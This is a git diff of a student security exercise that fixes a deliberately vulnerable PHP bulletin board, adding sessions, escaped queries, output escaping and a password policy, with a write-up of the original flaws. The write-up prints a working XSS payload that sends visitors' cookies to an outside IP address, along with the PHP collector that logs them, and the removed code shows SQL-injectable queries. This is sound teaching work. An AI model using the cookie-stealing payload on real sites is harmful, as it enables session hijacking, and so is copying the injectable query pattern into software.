-<link href="style.css" rel="stylesheet" type="text/css" media="screen" />
-<?php
-	include('header.php');
-?>
+	
+	$title = htmlspecialchars(trim($_POST["title"]));
+	$message = htmlspecialchars(trim($_POST["message"]));
+
+	$auth->query("INSERT INTO threads (username, title, message, date) VALUES('%s', '%s', '%s', '%d')", array(
+		$_SESSION["username"],
+		$title,
+		$message,
+		time()
+	), true);
+	
+	header("Location: members.php");
+}
+
+
+require("_inc/header.php");
+?> 
+
 <div class="post">
 	<div class="post-bgtop">
-		<div class="post-bgbtm">
-        <h2 class = "title">hackme bulletin board</h2>
-        	<?php
-            if(!isset($_COOKIE['hackme'])){
-				 die('Why are you not logged in?!');
-			}else
-			{
-				print("<p>Logged in as <a>$_COOKIE[hackme]</a></p>");
-			}
-			?>
-            
+		<div class="post-bgbtm">            
             <h2 class="title">NEW POST</h2>
-            <p class="meta">by <a href="#"><? echo $_COOKIE['hackme'] ?> </a></p>
+            <p class="meta">by <a href="#"><?php echo $_SESSION["username"]; ?> </a></p>
             <p> do not leave any fields blank... </p>
             
             <form method="post" action="post.php">
@@ -62,9 +49,4 @@
         </div>
     </div>
 </div>
-
-<?php
-	include('footer.php');
-?>
-</body>
-</html>
\ No newline at end of file
+<?php require("_inc/footer.php"); ?>
\ No newline at end of file
diff --git a/project-essay.md b/project-essay.md
new file mode 100644
index 0000000..058b3ea
--- /dev/null
+++ b/project-essay.md
@@ -0,0 +1,65 @@
+# Project Writeup
+
+Bradley Rosenfeld - COS342, 11/14/15
+
+## Part 1.
+
+Overall this application was extremely vulnerable to all sorts of different attacks. Malicious users could run arbitrary SQL queries as well as insert XSS attacks into posts. I outlined below my response to the specific security policies laid out in the assignment.
+
+1. The application tries to prevent access to messages by checking for the existence of a cookie that is created when the user is authenticated and logged in. Messages can be deleted by visiting a GET URL, the link to which is only visible when the user who is viewing the message has a cookie that matches the user who created the message. Even worse, the deletion action is vulnerable to SQL injection which would allow any user to delete any post or worse.
+
+ Unfortunately, these security policies are not adequate to prevent unauthorized access. Malicious users can easily create a cookie called "hackme" which contains the username which they wish to target. The actual message deletion action doesn't check to see if the user is authorized, anyone can enter an arbitrary message ID which they wish to delete. 
+
+ In order to fix this I implemented PHP sessions. Rather than sending the actual username and password as a cookie, a unique session ID is set which an attacker wouldn't be able to guess (they could snoop for it, but that is addressed later). The application then checks for the existence of the session ID and makes sure it is valid. Similarly, the deletion action will check to make sure the user is actually authorized and that the ID provided is valid.
+
+2. The database only contains password hashes. The passwords are not hashed with a strong algorithm and they are not salted resulting in duplication of hashes.
+
+ I fixed this by moving to a newer PHP function `password_hash()` which uses a much strong hashing function, handles salting, and enforces a "cost" which slows down direct brute force attacks on the server.
+
+3. Attackers can easily snoop for user credentials for multiple reasons. Since the site is not HTTPS, usernames and passwords are sent via plaintext over the network. Furthermore, the username and hashed password are stored in cookies which are sent with every network request. It would be trivial to snoop for credentials.
+
+ To fully fix this, I would need to enable HTTPS. But I did stop saving the username and password in a cookie. Instead I use a unique PHP session ID for further authentication.
+
+4. Login attempts are not rate limited, making brute force attacks trivial.
+ 
+ I fixed this by slowing down the number of attempts allowed per minute on a user. Once the user has exceeded 5 attempts, they have to wait a minute before trying again.
+
+5. No password scheme was implemented, users could submit anything as a password.
+ 
+ I implemented a password policy that says passwords must be at least 8 characters long, aren't dictionary words, and don't have too many letters, numbers, or special characters (must be a combination). This policy is enforced by my PHP Password class in the check() method.
+
+
+I also solved a lot of the possible SQL injection attacks on the website by using `mysqli_real_escape_string()`. This function automatically escapes quotes and other special characters preventing attackers from running their own commands.
+
+## Part 2
+
+The attacker could post an image that fails to load, forcing JS to run. In this case, I wrote a simple script that sends the user's cookie to the remote server.
+
+```
+<img src="fdfjkdfjfkjdfdf.dfdjf" onerror="this.src=\'http://10.121.20.103/hackme-xss.php?c=\' + document.cookie">
+```
+
+If you're on the Taylor University network, you can view the result of this attack by visiting [10.121.20.103/hackme-xss.php](http://10.121.20.103/hackme-xss.php)
+
+In order to fix this, I disabled all usage of HTML in messages by using the `htmlspecialchars` function in PHP when rendering the user submitted content.
+
+The source code of the attacker server is as follows:
+
+```
+<?php
+$secretFile = "/tmp/foo.txt";
+if (isset($_GET['c'])) {
+	$fh = fopen($secretFile, 'a') or die("can’t open file");	
+	$stringData = $_GET['c']."\n";
+	fwrite($fh, $stringData);
+	fclose($fh);
+
+	//Send an img
+	header("Content-Type: image/png");
+} else {
+	header("Content-Type: text/plain");
+	readfile($secretFile);
+}
+?>
+```
+
diff --git a/readme.md b/readme.md
new file mode 100644
index 0000000..86fbeab
--- /dev/null
+++ b/readme.md
@@ -0,0 +1,15 @@
+#Hackme
+
+Welcome to hackme, an information security exercise for COS342 (Fall 2015) at Taylor University.
+
+For this project, I was given some dangerously bad code and instructed to fix it as well as do a writeup on what types of attacks would be possible with this code.
+
+You can see how the system initially looked in the very first commit.
+
+Please be warned that this **is not production code** and should only be used as an exercise in securing a web application. I may have missed stuff, and there are certainly some code style things I would like to fix (if I had time.)
+
+##Writeup
+
+You can read the writeup in [project-essay.md](project-essay.md)
+
+*(Note: some of the specific examples are hosted on the local Taylor University network, so they cannot be viewed)*
\ No newline at end of file
diff --git a/register.php b/register.php
old mode 100644
new mode 100755
index 66a35df..d2f1a28
--- a/register.php
+++ b/register.php
@@ -1,49 +1,35 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-<title>hackme</title>
-<link href="style.css" rel="stylesheet" type="text/css" media="screen" />
 <?php
-	include('connect.php');
-	include('header.php');
-	connect();
+require("_inc/functions.php");
+
+//Redirect to members page if logged in
+if ($auth->logged_in) {
+    header("Location: members.php");
+}
+
+if (isset($_POST['submit'])) {
+    
+    if(!isset($_POST['uname']) || !isset($_POST['password']) || !isset($_POST['fname']) || !isset($_POST['lname'])) {
+        die('<p>You did not fill in a required field.
+        Please go back and try again!</p>');
+    }
+    
+    if (!$auth->createUser($_POST["uname"], $_POST["password"], $_POST["fname"], $_POST["lname"])) {
+        die("Sorry, can't create user");
+    } else {
+        $userCreated = true;
+    }
+}
+
+require("_inc/header.php");
 ?>
 <div class="post">
 	<div class="post-bgtop">
 		<div class="post-bgbtm">
         <h2 class = "title">hackme Registration</h2>
-        <?php
-		//if the registration form is submitted 
-		if (isset($_POST['submit'])) {
-			
-			$_POST['uname'] = trim($_POST['uname']);
-			if(!$_POST['uname'] | !$_POST['password'] |
-				!$_POST['fname'] | !$_POST['lname']) {
- 				die('<p>You did not fill in a required field.
-				Please go back and try again!</p>');
- 			}
-			
-			$passwordHash = sha1($_POST['password']);
-			
-			$check = mysql_query("SELECT * FROM users WHERE username = '".$_POST['uname']."'")or die(mysql_error());
- 
- 		//Gives error if user already exist
- 		$check2 = mysql_num_rows($check);
-		if ($check2 != 0) {
-			die('<p>Sorry, user name already exisits.</p>');
-		}
-		else
-		{
-			mysql_query("INSERT INTO users (username, pass, fname, lname) VALUES ('".$_POST['uname']."', '". $passwordHash ."', '". $_POST['fname']."', '". $_POST['lname'] ."');")or die(mysql_error());
-			
-			echo "<h3> Registration Successful!</h3> <p>Welcome ". $_POST['fname'] ."! Please log in...</p>";
-		} 
-        ?>    
-        <?php
-		}else{
-        ?>
-        	<form  method="post" action="register.php">
+        <?php if (isset($userCreated)) : ?>
+            <h3>Registration Successful!</h3> <p>Welcome <?php echo $_POST['fname']; ?>! Please log in...</p>
+        <?php else : ?>
+        	<form method="post" action="register.php">
             <table>
                 <tr>
                     <td> Username </td> 
@@ -53,6 +39,14 @@
                 <tr>
                     <td> Password </td>
                     <td> <input type="password" name="password" maxlength="40" /> </td>
+                    <td>
+                        <em>Password must match requirements</em>
+                        <ul>
+                            <li>Must be at least 8 characters</li>
+                            <li>Must not be a dictionary word</li>
+                            <li>Password cannot be primarily letters, numbers, or special characters (must be a combination of them)</li>
+                        </ul>
+                    </td>
                 </tr>
                 <tr>
                     <td> First Name </td>
@@ -67,14 +61,9 @@
                 </tr>
             </table>
             </form>
-        <?php
-		}
-		?>
+        <?php endif; ?>
         </div>
     </div>
 </div>
-<?php
-	include('footer.php');
-?>
-</body>
-</html>
\ No newline at end of file
+
+<?php require("_inc/footer.php"); ?>
\ No newline at end of file
diff --git a/show.php b/show.php
old mode 100644
new mode 100755
index 3c53915..540e771
--- a/show.php
+++ b/show.php
@@ -1,64 +1,46 @@
-<?php
-	// Connects to the Database 
-	include('connect.php');
-	connect(); 
+<?php 
+define("MEMBERS_ONLY", true);
+
+require("_inc/functions.php");
+
+//if the login form is submitted 
+if (!isset($_GET['pid'])) {
 	
-	//if the login form is submitted 
-	if (!isset($_GET['pid'])) {
-		
-		if (isset($_GET['delpid'])){
-			mysql_query("DELETE FROM threads WHERE id = '".$_GET[delpid]."'") or die(mysql_error());
-		}
-			header("Location: members.php");
+	//Handle thread deletion
+	if (isset($_GET['delpid'])) {
+		$auth->query("DELETE FROM threads WHERE id = '%d' AND username = '%s'", array($_GET["delpid"], $_SESSION["username"]), true);
 	}
-		?>  
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-<title>hackme</title>
-<link href="style.css" rel="stylesheet" type="text/css" media="screen" />
-<?php
-	include('header.php');
-	if(!isset($_COOKIE['hackme'])){
-		 die('Why are you not logged in?!');
-	}else
-	{
-		print("<p>Logged in as <a>$_COOKIE[hackme]</a></p>");
-	}
-?>
+	
+	header("Location: members.php");
+}
+
+require("_inc/header.php");
+?> 
+
 <?php
-	$threads = mysql_query("SELECT * FROM threads WHERE id = '".$_GET[pid]."'") or die(mysql_error());
-	while($thisthread = mysql_fetch_array( $threads )){
+	$threads = $auth->query("SELECT * FROM threads WHERE id = '%d' ORDER BY date DESC", array($_GET["pid"]), true);
+	if (count($threads) === 0) echo "No thread found matching this ID"; 
+    foreach($threads as $thread) :
 ?>
 	<div class="post">
-	<div class="post-bgtop">
-	<div class="post-bgbtm">
-		<h2 class="title"><a href="show.php?pid=<? echo $thisthread[id] ?>"><? echo $thisthread[title]?></a></h2>
-							<p class="meta"><span class="date"> <? echo date('l, d F, Y',$thisthread[date]) ?> - Posted by <a href="#"><? echo $thisthread[username] ?> </a></p>
-         
-         <div class="entry">
-			
-            <? echo $thisthread[message] ?>
-            					
-		 </div>
-         
-	</div>
-	</div>
-	</div>
-    
-    <?php
-		if ($_COOKIE[hackme] == $thisthread[username])
-		{
-	?>
-    	<a href="show.php?delpid=<? echo $thisthread[id]?>">DELETE</a>
-    <?php
-		}
-	?> 
+		<div class="post-bgtop">
+			<div class="post-bgbtm">
+				<h2 class="title">
+					<a href="show.php?pid=<?php echo htmlspecialchars($thread->id); ?>"><?php echo htmlspecialchars($thread->title); ?>
+					</a>
+				</h2>
+				<p class="meta">
+					<span class="date"><?php echo date('l, d F, Y', htmlspecialchars($thread->date)); ?></span> - Posted by <a href="#"><?php echo htmlspecialchars($thread->username); ?></a>
+				</p>
+				<div class="entry">
+					<p><?php echo htmlspecialchars($thread->message); ?></p>
+				</div>
+				<?php if ($_SESSION["username"] === $thread->username) : ?>
+			    	<p><a href="show.php?delpid=<?php echo htmlspecialchars($thread->id); ?>">DELETE</a></p>
+				<?php endif; ?> 
+			</div>
+		</div>
+	</div> 
+<?php endforeach; ?>
 
-<?php
-}
-	include('footer.php');
-?>
-</body>
-</html>
\ No newline at end of file
+<?php require("_inc/footer.php"); ?>
\ No newline at end of file
diff --git a/style.css b/style.css
deleted file mode 100644
index de50145..0000000
--- a/style.css
+++ /dev/null
@@ -1,478 +0,0 @@
-body {
-	margin: 20px 0px 0px 0px;
-	padding: 0;
-	background: #191919 url(images/img07.jpg) no-repeat right top;
-	font-family: Tahoma, Geneva, sans-serif;
-	font-size: 11px;
-	color: #3C3C3C;
-}
-
-h1, h2, h3 {
-	margin: 0;
-	font-family: Arial, Helvetica, sans-serif;
-	font-weight: normal;
-	color: #300;
-}
-
-h1 {
-	font-size: 44px;
-}
-
-h2 {
-	font-size: 18px;
-}
-
-h3 {
-}
-
-p, ul, ol {
-	margin-top: 0;
-	line-height: 240%;
-	text-align: justify;
-}
-
-ul, ol {
-}
-
-blockquote {
-}
-
-a {
-	color: #900;
-}
-
-a:hover {
-	text-decoration: none;
-}
-
-a img {
-	border: none;
-}
-
-img.left {
-	float: left;
-	margin: 7px 30px 0 0;
-}
-
-img.right {
-	float: right;
-	margin: 7px 0 0 30px;
-}
-
-hr {
-	display: none;
-}
-
-.list1 {
-}
-
-.list1 li {
-	float: left;
-	line-height: normal;
-}
-
-.list1 li img {
-	margin: 0 30px 30px 0;
-}
-
-.list1 li.alt img {
-	margin-right: 0;
-}
-
-#wrapper {
-}
-
-/* Header */
-
-#header {
-	width: 930px;
-	height: 70px;
-	margin: 0px auto;
-}
-
-/* Menu */
-
-#menu {
-}
-
-#menu ul {
-	margin: 0;
-	padding: 8px 0px 0px 0px;
-	list-style: none;
-	line-height: normal;
-}
-
-#menu li {
-	display: block;
-	float: left;
-}
-
-#menu a {
-	display: block;
-	float: left;
-	height: 28px;
-	background: #900;
-	margin-right: 3px;
-	padding: 8px 30px 0px 35px;
-	letter-spacing: -1px;
-	text-decoration: none;
-	text-align: center;
-	text-transform: lowercase;
-	font-family: Arial, Helvetica, sans-serif;
-	font-size: 14px;
-	font-weight: normal;
-	color: #FFFFFF;
-}
-
-#menu a:hover {
-	text-decoration: none;
-}
-
-#menu li.current_page_item {
-}
-
-#menu li.current_page_item a {
-}
-
-#menu .first {
-}
-
-/* Search */
-
-#search {
-	float: right;
-	padding: 10px 10px 0px 0px;
-}
-
-#search form {
-	float: right;
-	margin: 0;
-	padding: 4px 0px 0 0;
-}
-
-#search fieldset {
-	margin: 0;
-	padding: 0;
-	border: none;
-}
-
-#search input {
-	float: left;
-	font: 12px Georgia, "Times New Roman", Times, serif;
-}
-
-#search-text {
-	width: 213px;
-	height: 28px;
-	padding: 6px 0 0 7px;
-	border: none;
-	background: url(images/img02.jpg) no-repeat left top;
-	color: #000000;
-}
-
-#search-submit {
-	width: 82px;
-	height: 28px;
-	margin-left: 10px;
-	padding: 0px 5px;
-	color:#900
-	border: none;
-	text-indent: -9999px;
-	color: #FFFFFF;
-}
-
-/* Page */
-
-#page {
-	width: 930px;
-	margin: 0px auto;
-	padding: 10px 10px 10px 10px;
-	background: #E1E1E1;
-}
-
-#page-bgtop {
-}
-
-#page-bgbtm {
-	overflow: hidden;
-}
-
-/** LOGO */
-
-#logo {
-	width: 930px;
-	height: 135px;
-	margin: 0 auto;
-	background-color:#900;
-}
-
-#logo h1, #logo p {
-	margin: 0px;
-	line-height: normal;
-	text-transform: lowercase;
-	font-weight: normal;
-	color: #FFFFFF;
-}
-
-#logo p {
-	margin-top: -4px;
-	padding: 0px 0px 0px 145px;
-	text-transform: lowercase;
-	font-family: Georgia, "Times New Roman", Times, serif;
-	font-size: 13px;
-	color: #FFFFFF;
-}
-
-#logo h1 {
-	padding: 30px 0px 0px 140px;
-	letter-spacing: -1px;
-	font-size: 48px;
-}
-
-#logo h1 a {
-	text-decoration: none;
-	color: #FFFFFF;
-}
-
-#logo a {
-	text-decoration: none;
-	color: #FFFFFF;
-}
-
-#banner {
-	padding-bottom: 20px;
-}
-
-/* Content */
-
-#content {
-	float: right;
-	width: 930px;
-	padding: 0px 0px 0px 0px;
-}
-
-/* Post */
-
-.post {
-	background: url(images/img05.jpg) repeat-y left top;
-}
-
-.post-bgtop {
-	background: url(images/img04.jpg) no-repeat left top;
-}
-
-.post-bgbtm {
-	padding: 0px 30px 20px 30px;
-	background: url(images/img06.jpg) no-repeat left bottom;
-}
-
-.post .title {
-	height: 44px;
-	margin: 0px;
-	padding: 36px 0px 0px 0px;
-	background: url(images/img11.jpg) repeat-x left bottom;
-	
-	letter-spacing: -2px;
-	text-transform: lowercase;
-	font-size: 36px;
-	color: #900;
-}
-
-.post .title a {
-	letter-spacing: -2px;
-	text-decoration: none;
-	text-transform: lowercase;
-	font-size: 36px;
-	color: #900;
-}
-
-.post .title a:hover {
-	color: #424242;
-}
-
-.post .meta {
-	margin-left: 2px;
-	padding: 4px 30px 2px 0px;
-	text-transform: uppercase;
-	font-family: Arial, Helvetica, sans-serif;
-	font-weight: bold;
-	font-size: 11px;
-	color: #66665E;
-}
-
-.post .meta span {
-	margin: 0px;
-}
-
-.post .meta a {
-	text-decoration: none;
-}
-
-.post .entry {
-	padding: 10px 0px 0px 0px;
-}
-
-.post .comments {
-	display: block;
-	width: 120px;
-	height: 18px;
-	margin: 0px;
-	padding: 3px 0px 0px 40px;
-	background: #90BF35;
-	border: 1px solid #5F817E;
-	text-decoration: none;
-	font-family: Arial, Helvetica, sans-serif;
-	font-size: 11px;
-	text-decoration: none;
-	font-weight: bold;
-	color: #FFFFFF;
-}
-
-/* Sidebar */
-
-#sidebar {
-	float: left;
-	width: 310px;
-	font-family: Arial, Helvetica, sans-serif;
-}
-
-#sidebar ul {
-	margin: 0;
-	padding: 0;
-	background:  none;
-	list-style: none;
-	line-height: normal;
-}
-
-#sidebar li {
-	background: url(images/img09.jpg) repeat-y left top;
-}
-
-#sidebar li ul {
-	margin: 0px 0px;
-	padding: 0px 0px 20px 0px;
-	background: url(images/img10.jpg) no-repeat left bottom;
-}
-
-#sidebar li li {
-	margin: -20px 30px 20px 30px;
-	padding: 8px 0px 8px 10px;
-	border-bottom: 1px solid #E0E0E0;
-	background: url(images/img12.jpg) no-repeat left 13px;
-}
-
-#sidebar li li a {
-	font-weight: normal;
-}
-
-#sidebar li li a:hover {
-	color: #900;
-}
-
-#sidebar p {
-	margin: 0;
-	padding: 0px 14px;
-}
-
-#sidebar h2 {
-	height: 50px;
-	margin: 0px;
-	padding: 30px 0px 13px 30px;
-	background: url(images/img08.jpg) no-repeat left top;
-	letter-spacing: -1px;
-	text-transform: lowercase;
-	font-size: 24px;
-	font-weight: normal;
-	color: #900;
-}
-
-#sidebar p {
-	line-height: 200%;
-}
-
-#sidebar a {
-	text-align: left;
-	text-decoration: none;
-	font-weight: bold;
-	color: #666666;
-}
-
-/* Calendar */
-
-#calendar {
-}
-
-#calendar caption {
-	padding-bottom: 5px;
-	font-weight: bold;
-}
-
-#calendar table {
-	width: 100%;
-	border-collapse: collapse;
-	border-bottom: 1px solid #24130F;
-	border-left: 1px solid #24130F;
-	border-right: 1px solid #24130F;
-}
-
-#calendar thead th {
-	padding: 5px 0;
-	text-align: center;
-	border-top: 1px solid #24130F;
-	border-left: 1px solid #24130F;
-	background: #24130F;
-}
-
-#calendar tbody td {
-	padding: 5px 0;
-	text-align: center;
-	border-top: 1px solid #24130F;
-	border-left: 1px solid #24130F;
-	border-bottom: 1px solid #24130F;
-}
-
-#calendar tfoot td {
-	padding: 5px;
-	border-left: 1px solid #24130F;
-	border-bottom: 1px solid #24130F;
-}
-
-#calendar tfoot #next {
-	border-top: 1px solid #24130F;
-	text-align: right;
-}
-
-#calendar tfoot #prev {
-	border-top: 1px solid #24130F;
-}
-
-#calendar .pad {
-	border-bottom: 1px solid #24130F;
-}
-
-#calendar #today {
-	background: #24130F;
-}
-
-/* Footer */
-
-#footer {
-	width: 920px;
-	height: 100px;
-	margin: 0 auto;
-	padding: 0;
-}
-
-#footer-bgcontent {
-}
-
-#footer p {
-	margin: 0;
-	padding: 30px 0px 0px 0px;
-	text-align: center;
-	line-height: normal;
-	font-size: 11px;
-}
-
-#footer a {
-}
diff --git a/users.txt b/users.txt
old mode 100644
new mode 100755
